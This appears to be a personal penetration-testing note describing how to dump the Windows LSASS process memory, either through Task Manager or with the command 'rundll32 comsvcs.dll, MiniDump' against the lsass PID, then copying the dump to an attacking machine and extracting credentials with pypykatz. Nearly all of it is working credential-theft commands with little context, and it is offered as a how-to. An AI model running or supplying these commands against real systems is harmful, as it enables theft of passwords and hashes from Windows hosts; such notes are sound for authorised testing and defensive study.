#### Dump LSASSY (GUI)

Right click Local Security Authority Process - create dump file.

![[Pasted image 20250121175948.png]]

Copy dmp file to attacking system, then run pypykatsz

```bash
pypykatz lsa minidump lsass.DMP
```

#### Dump LSASSY (CLI)

First find lsass.exe in using either cmd or a PowerShell prompt. We need to take note of the PID

CMD:

![[Pasted image 20250121180343.png]]

Powershell: 

![[Pasted image 20250121180642.png]]

In an elevated PowerShell prompt run the following:

```bash
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 656 C:\windows\tasks\lsass.dmp full
```

Then copy over to attacking system, and extract using the pypykatz mentioned above